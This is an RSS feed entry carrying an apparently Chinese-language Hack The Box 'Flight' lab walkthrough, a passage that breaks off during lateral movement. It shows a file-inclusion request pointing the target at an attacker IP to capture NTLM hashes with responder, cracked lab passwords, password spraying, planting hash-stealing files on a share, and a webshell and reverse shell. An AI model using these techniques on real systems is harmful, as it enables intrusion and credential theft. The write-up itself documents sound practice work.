<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>JoWhite</title>
        <link>http://localhost:1313/en/</link>
        <description>Recent content on JoWhite</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en</language>
        <copyright>Jowhite</copyright>
        <lastBuildDate>Fri, 30 May 2025 13:46:56 +0000</lastBuildDate><atom:link href="http://localhost:1313/en/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>HTB-Flight-Writeup</title>
        <link>http://localhost:1313/htb-flight-Writeup/</link>
        <pubDate>Fri, 30 May 2025 13:46:56 +0000</pubDate>
        
        <guid>http://localhost:1313/htb-flight-Writeup/</guid>
        <description>&lt;img src="http://localhost:1313/legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e-150x150.webp" alt="Featured image of post HTB-Flight-Writeup" /&gt;&lt;div class=&#34;wp-block-image&#34;&gt;
  &lt;figure class=&#34;aligncenter size-full&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;300&#34; height=&#34;300&#34; src=&#34;../legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e.webp&#34; alt=&#34;&#34; class=&#34;wp-image-1483&#34; srcset=&#34;../legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e.webp 300w, ../legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e-150x150.webp 150w&#34; sizes=&#34;auto, (max-width: 300px) 100vw, 300px&#34; /&gt;&lt;/figure&gt;
&lt;/div&gt;
&lt;h2 id=&#34;machine-info&#34;&gt;Machine Info
&lt;/h2&gt;&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    Difficulty: Hard
  &lt;/li&gt;
  &lt;li&gt;
    OS: Windows
  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nmap-result&#34;&gt;Nmap Result
&lt;/h2&gt;&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-29 21:10:16Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49735/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
&lt;/pre&gt;
&lt;/div&gt;
&lt;h2 id=&#34;enumeration-wp-block-heading&#34;&gt;Enumeration {.wp-block-heading}&lt;figure class=&#34;wp-block-image size-large&#34;&gt;
&lt;/h2&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;534&#34; src=&#34;../legacy/uploads/2025/05/1748606731-image-1024x534.png&#34; alt=&#34;&#34; class=&#34;wp-image-1482&#34; srcset=&#34;../legacy/uploads/2025/05/1748606731-image-1024x534.png 1024w, ../legacy/uploads/2025/05/1748606731-image-300x156.png 300w, ../legacy/uploads/2025/05/1748606731-image-768x400.png 768w, ../legacy/uploads/2025/05/1748606731-image-1536x800.png 1536w, ../legacy/uploads/2025/05/1748606731-image.png 1591w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;80端口是一个机票预订网站，没有什么有用信息。用ffuf遍历也没找到有用信息。用enum4linux查看smb服务:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;255&#34; src=&#34;../legacy/uploads/2025/05/1748606876-image-1024x255.png&#34; alt=&#34;&#34; class=&#34;wp-image-1486&#34; srcset=&#34;../legacy/uploads/2025/05/1748606876-image-1024x255.png 1024w, ../legacy/uploads/2025/05/1748606876-image-300x75.png 300w, ../legacy/uploads/2025/05/1748606876-image-768x191.png 768w, ../legacy/uploads/2025/05/1748606876-image.png 1206w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;允许匿名登录，但无法list shares:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;210&#34; src=&#34;../legacy/uploads/2025/05/1748606902-image-1024x210.png&#34; alt=&#34;&#34; class=&#34;wp-image-1487&#34; srcset=&#34;../legacy/uploads/2025/05/1748606902-image-1024x210.png 1024w, ../legacy/uploads/2025/05/1748606902-image-300x62.png 300w, ../legacy/uploads/2025/05/1748606902-image-768x158.png 768w, ../legacy/uploads/2025/05/1748606902-image.png 1038w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;查看ldap服务是否无需验证就可以请求信息：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;961&#34; height=&#34;351&#34; src=&#34;../legacy/uploads/2025/05/1748606963-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1489&#34; srcset=&#34;../legacy/uploads/2025/05/1748606963-image.png 961w, ../legacy/uploads/2025/05/1748606963-image-300x110.png 300w, ../legacy/uploads/2025/05/1748606963-image-768x281.png 768w&#34; sizes=&#34;auto, (max-width: 961px) 100vw, 961px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;需要认证。转头去看http服务，用ffuf遍历看看是否有子域名：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;363&#34; src=&#34;../legacy/uploads/2025/05/1748607021-image-1024x363.png&#34; alt=&#34;&#34; class=&#34;wp-image-1491&#34; srcset=&#34;../legacy/uploads/2025/05/1748607021-image-1024x363.png 1024w, ../legacy/uploads/2025/05/1748607021-image-300x106.png 300w, ../legacy/uploads/2025/05/1748607021-image-768x272.png 768w, ../legacy/uploads/2025/05/1748607021-image-1536x545.png 1536w, ../legacy/uploads/2025/05/1748607021-image.png 1675w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;发现子域名school. 加入到/etc/hosts 里面并访问:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;590&#34; src=&#34;../legacy/uploads/2025/05/1748607059-image-1024x590.png&#34; alt=&#34;&#34; class=&#34;wp-image-1493&#34; srcset=&#34;../legacy/uploads/2025/05/1748607059-image-1024x590.png 1024w, ../legacy/uploads/2025/05/1748607059-image-300x173.png 300w, ../legacy/uploads/2025/05/1748607059-image-768x443.png 768w, ../legacy/uploads/2025/05/1748607059-image.png 1480w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;rfi---steal-ntlm&#34;&gt;RFI -&amp;gt; Steal NTLM
&lt;/h2&gt;&lt;p&gt;在查看一番后只有这里最让我感觉可疑：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;542&#34; src=&#34;../legacy/uploads/2025/05/1748607095-image-1024x542.png&#34; alt=&#34;&#34; class=&#34;wp-image-1494&#34; srcset=&#34;../legacy/uploads/2025/05/1748607095-image-1024x542.png 1024w, ../legacy/uploads/2025/05/1748607095-image-300x159.png 300w, ../legacy/uploads/2025/05/1748607095-image-768x407.png 768w, ../legacy/uploads/2025/05/1748607095-image.png 1267w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;看到这种链接就会想起LFI，尝试一下：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;425&#34; src=&#34;../legacy/uploads/2025/05/1748607184-image-1024x425.png&#34; alt=&#34;&#34; class=&#34;wp-image-1496&#34; srcset=&#34;../legacy/uploads/2025/05/1748607184-image-1024x425.png 1024w, ../legacy/uploads/2025/05/1748607184-image-300x124.png 300w, ../legacy/uploads/2025/05/1748607184-image-768x319.png 768w, ../legacy/uploads/2025/05/1748607184-image.png 1140w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;请求被拦截. 探索一番后发现后端会拦截包含 .. 的请求&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;656&#34; height=&#34;456&#34; src=&#34;../legacy/uploads/2025/05/1748607234-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1498&#34; srcset=&#34;../legacy/uploads/2025/05/1748607234-image.png 656w, ../legacy/uploads/2025/05/1748607234-image-300x209.png 300w&#34; sizes=&#34;auto, (max-width: 656px) 100vw, 656px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;于是我就尝试了下全局路径：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;400&#34; src=&#34;../legacy/uploads/2025/05/1748607274-image-1024x400.png&#34; alt=&#34;&#34; class=&#34;wp-image-1500&#34; srcset=&#34;../legacy/uploads/2025/05/1748607274-image-1024x400.png 1024w, ../legacy/uploads/2025/05/1748607274-image-300x117.png 300w, ../legacy/uploads/2025/05/1748607274-image-768x300.png 768w, ../legacy/uploads/2025/05/1748607274-image.png 1122w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;LFI成功. 用ffuf遍历了一些常见的配置文件，都没有找到有用的信息。&lt;/p&gt;
&lt;p&gt;此时想到靶机可能还有RFI，尝试一下:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
echo &amp;#039;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#039; &amp;gt; phpinfo.php
# 在网页请求
http://school.flight.htb/index.php?view=http://10.10.16.8/phpinfo.php
&lt;/pre&gt;
&lt;/div&gt;&lt;figure class=&#34;wp-block-image size-large&#34;&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;385&#34; src=&#34;../legacy/uploads/2025/05/1748607728-image-1024x385.png&#34; alt=&#34;&#34; class=&#34;wp-image-1503&#34; srcset=&#34;../legacy/uploads/2025/05/1748607728-image-1024x385.png 1024w, ../legacy/uploads/2025/05/1748607728-image-300x113.png 300w, ../legacy/uploads/2025/05/1748607728-image-768x289.png 768w, ../legacy/uploads/2025/05/1748607728-image.png 1317w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;虽然访问成功，但php并没有执行。此时想到了还可以让靶机想我请求smb连接. 先开启responder监听：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
sudo responder -I tun0
#然后再请求
http://school.flight.htb/index.php?view=//10.10.16.8/test
&lt;/pre&gt;
&lt;/div&gt;&lt;figure class=&#34;wp-block-image size-full&#34;&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;786&#34; height=&#34;233&#34; src=&#34;../legacy/uploads/2025/05/1748607897-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1507&#34; srcset=&#34;../legacy/uploads/2025/05/1748607897-image.png 786w, ../legacy/uploads/2025/05/1748607897-image-300x89.png 300w, ../legacy/uploads/2025/05/1748607897-image-768x228.png 768w&#34; sizes=&#34;auto, (max-width: 786px) 100vw, 786px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    原理：当windows环境内的php遇到诸如 //x.x.x.x/xxx 这样的路径时，会把这个地址理解为UNC路径，即 &lt;strong&gt;//服务器/共享名/文件名&lt;/strong&gt;. 随后系统识别路径为网络路径，于是发起smb连接。（p.s. 在linux环境下则不行）
  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;initial-foothold&#34;&gt;Initial Foothold
&lt;/h2&gt;&lt;p&gt;截取到了svc_apache的NTLMv2 hash，交给john本地爆破:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
john --wordlist=/usr/share/wordlists/rockyou.txt apahash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R &amp;#x5B;MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press &amp;#039;q&amp;#039; or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)     
1g 0:00:00:02 DONE (2025-05-30 22:30) 0.3663g/s 3906Kp/s 3906Kc/s 3906KC/s SADSAM..S42150461
Use the &#34;--show --format=netntlmv2&#34; options to display all of the cracked passwords reliably
Session completed. 
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;获取密码 S@Ss!K@*t13 有了密码后则可以用bloodhound-python远程拉取AD架构信息：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;400&#34; src=&#34;../legacy/uploads/2025/05/1748608419-image-1024x400.png&#34; alt=&#34;&#34; class=&#34;wp-image-1513&#34; srcset=&#34;../legacy/uploads/2025/05/1748608419-image-1024x400.png 1024w, ../legacy/uploads/2025/05/1748608419-image-300x117.png 300w, ../legacy/uploads/2025/05/1748608419-image-768x300.png 768w, ../legacy/uploads/2025/05/1748608419-image.png 1196w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;上传到bloodhound并分析：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;538&#34; src=&#34;../legacy/uploads/2025/05/1748608470-image-1024x538.png&#34; alt=&#34;&#34; class=&#34;wp-image-1515&#34; srcset=&#34;../legacy/uploads/2025/05/1748608470-image-1024x538.png 1024w, ../legacy/uploads/2025/05/1748608470-image-300x158.png 300w, ../legacy/uploads/2025/05/1748608470-image-768x403.png 768w, ../legacy/uploads/2025/05/1748608470-image.png 1400w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可惜的是SVC_APACHE好像并不能做什么. 但目前获得了域内的用户：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
WebDevs
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;用crackmapexec尝试看有没有密码复用：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;275&#34; src=&#34;../legacy/uploads/2025/05/1748608633-image-1024x275.png&#34; alt=&#34;&#34; class=&#34;wp-image-1517&#34; srcset=&#34;../legacy/uploads/2025/05/1748608633-image-1024x275.png 1024w, ../legacy/uploads/2025/05/1748608633-image-300x81.png 300w, ../legacy/uploads/2025/05/1748608633-image-768x206.png 768w, ../legacy/uploads/2025/05/1748608633-image.png 1325w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;S.Moon复用了密码. &lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;624&#34; src=&#34;../legacy/uploads/2025/05/1748608685-image-1024x624.png&#34; alt=&#34;&#34; class=&#34;wp-image-1519&#34; srcset=&#34;../legacy/uploads/2025/05/1748608685-image-1024x624.png 1024w, ../legacy/uploads/2025/05/1748608685-image-300x183.png 300w, ../legacy/uploads/2025/05/1748608685-image-768x468.png 768w, ../legacy/uploads/2025/05/1748608685-image.png 1312w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;但从bloodhound上看, S.Moon也没用什么特殊的权限. 用crackmapexec看看S.Moon的smb权限：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;272&#34; src=&#34;../legacy/uploads/2025/05/1748608767-image-1024x272.png&#34; alt=&#34;&#34; class=&#34;wp-image-1521&#34; srcset=&#34;../legacy/uploads/2025/05/1748608767-image-1024x272.png 1024w, ../legacy/uploads/2025/05/1748608767-image-300x80.png 300w, ../legacy/uploads/2025/05/1748608767-image-768x204.png 768w, ../legacy/uploads/2025/05/1748608767-image.png 1217w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Users像是在C:/Users下&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;931&#34; height=&#34;412&#34; src=&#34;../legacy/uploads/2025/05/1748608867-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1524&#34; srcset=&#34;../legacy/uploads/2025/05/1748608867-image.png 931w, ../legacy/uploads/2025/05/1748608867-image-300x133.png 300w, ../legacy/uploads/2025/05/1748608867-image-768x340.png 768w&#34; sizes=&#34;auto, (max-width: 931px) 100vw, 931px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;但并没有找到有用的信息。对Shared有写入权限，登录并查看：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;882&#34; height=&#34;198&#34; src=&#34;../legacy/uploads/2025/05/1748608808-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1523&#34; srcset=&#34;../legacy/uploads/2025/05/1748608808-image.png 882w, ../legacy/uploads/2025/05/1748608808-image-300x67.png 300w, ../legacy/uploads/2025/05/1748608808-image-768x172.png 768w&#34; sizes=&#34;auto, (max-width: 882px) 100vw, 882px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;里面是空的. 再看看Web&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;897&#34; height=&#34;191&#34; src=&#34;../legacy/uploads/2025/05/1748608907-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1526&#34; srcset=&#34;../legacy/uploads/2025/05/1748608907-image.png 897w, ../legacy/uploads/2025/05/1748608907-image-300x64.png 300w, ../legacy/uploads/2025/05/1748608907-image-768x164.png 768w&#34; sizes=&#34;auto, (max-width: 897px) 100vw, 897px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Web下是两个网站的根目录，但也没有有用的信息。在这个地方卡了许久，也确实是涉及到我的知识盲区了。看了一眼小提示，发现了这个&lt;a href=&#34;https://github.com/Greenwolf/ntlm_theft&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;github repo&lt;/a&gt;. 这个工具可以生成一系列用来窃取NTLM hash的文件，其中有的只需要有人浏览包含这个文件的目录就可以窃取NTLM hash.&lt;/p&gt;
&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    原理：当用户在Windows资源管理器中浏览文件夹时，系统会读取文件的元数据来显示图标、缩略图等. 把缩略图加载地址换为攻击者的服务器则可能窃取NTLM hash. 在这个过程中不需要用户点击或打开文件.
  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;clone下来运行：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;527&#34; src=&#34;../legacy/uploads/2025/05/1748609290-image-1024x527.png&#34; alt=&#34;&#34; class=&#34;wp-image-1531&#34; srcset=&#34;../legacy/uploads/2025/05/1748609290-image-1024x527.png 1024w, ../legacy/uploads/2025/05/1748609290-image-300x155.png 300w, ../legacy/uploads/2025/05/1748609290-image-768x396.png 768w, ../legacy/uploads/2025/05/1748609290-image.png 1029w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后把这些文件全部上传至shared这个共享文件夹:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;489&#34; src=&#34;../legacy/uploads/2025/05/1748609378-image-1024x489.png&#34; alt=&#34;&#34; class=&#34;wp-image-1533&#34; srcset=&#34;../legacy/uploads/2025/05/1748609378-image-1024x489.png 1024w, ../legacy/uploads/2025/05/1748609378-image-300x143.png 300w, ../legacy/uploads/2025/05/1748609378-image-768x367.png 768w, ../legacy/uploads/2025/05/1748609378-image.png 1062w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;有些上传失败了，不知道什么原因。但好在过了一会后抓取到了c.bum的hash：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;754&#34; height=&#34;181&#34; src=&#34;../legacy/uploads/2025/05/1748609410-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1535&#34; srcset=&#34;../legacy/uploads/2025/05/1748609410-image.png 754w, ../legacy/uploads/2025/05/1748609410-image-300x72.png 300w&#34; sizes=&#34;auto, (max-width: 754px) 100vw, 754px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;交给john来破解并得到c.bum的密码 c.bum: Tikkycoll_431012284&lt;/p&gt;
&lt;p&gt;在bloodhound里可以看到c.bum属于webdavs这个组:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;734&#34; height=&#34;468&#34; src=&#34;../legacy/uploads/2025/05/1748609494-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1537&#34; srcset=&#34;../legacy/uploads/2025/05/1748609494-image.png 734w, ../legacy/uploads/2025/05/1748609494-image-300x191.png 300w&#34; sizes=&#34;auto, (max-width: 734px) 100vw, 734px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;猜测c.bum可以修改web文件夹. 如果可以，那我们就能上传一个webshell获得RCE,用crackmapexec查看c.bum smb权限：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;280&#34; src=&#34;../legacy/uploads/2025/05/1748609629-image-1024x280.png&#34; alt=&#34;&#34; class=&#34;wp-image-1540&#34; srcset=&#34;../legacy/uploads/2025/05/1748609629-image-1024x280.png 1024w, ../legacy/uploads/2025/05/1748609629-image-300x82.png 300w, ../legacy/uploads/2025/05/1748609629-image-768x210.png 768w, ../legacy/uploads/2025/05/1748609629-image.png 1193w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;对Web有读写权限，那我们就可以上传一个webshell了:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;902&#34; height=&#34;72&#34; src=&#34;../legacy/uploads/2025/05/1748609752-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1541&#34; srcset=&#34;../legacy/uploads/2025/05/1748609752-image.png 902w, ../legacy/uploads/2025/05/1748609752-image-300x24.png 300w, ../legacy/uploads/2025/05/1748609752-image-768x61.png 768w&#34; sizes=&#34;auto, (max-width: 902px) 100vw, 902px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;打开浏览器访问:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;891&#34; height=&#34;232&#34; src=&#34;../legacy/uploads/2025/05/1748609772-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1543&#34; srcset=&#34;../legacy/uploads/2025/05/1748609772-image.png 891w, ../legacy/uploads/2025/05/1748609772-image-300x78.png 300w, ../legacy/uploads/2025/05/1748609772-image-768x200.png 768w&#34; sizes=&#34;auto, (max-width: 891px) 100vw, 891px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;成功。用&lt;a href=&#34;https://www.revshells.com/&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;generator&lt;/a&gt;生成一个ps的reverse shell:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;753&#34; height=&#34;112&#34; src=&#34;../legacy/uploads/2025/05/1748610886-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1547&#34; srcset=&#34;../legacy/uploads/2025/05/1748610886-image.png 753w, ../legacy/uploads/2025/05/1748610886-image-300x45.png 300w&#34; sizes=&#34;auto, (max-width: 753px) 100vw, 753px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;获得shell&lt;/p&gt;
&lt;h2 id=&#34;lateral-movement&#34;&gt;Lateral Movement
&lt;/h2&gt;&lt;p&gt;因为我们已经有了c.bum的密码，则可以利用runas来以c.bum的身份来运行指令，但windows原生的runas需要一个interactive shell来输入密码。利用&lt;a href=&#34;https://github.com/antonioCoco/RunasCs&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;RunasCs&lt;/a&gt;这个工具可以直接输入命令行输入密码. 上传RunasCs并运行:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
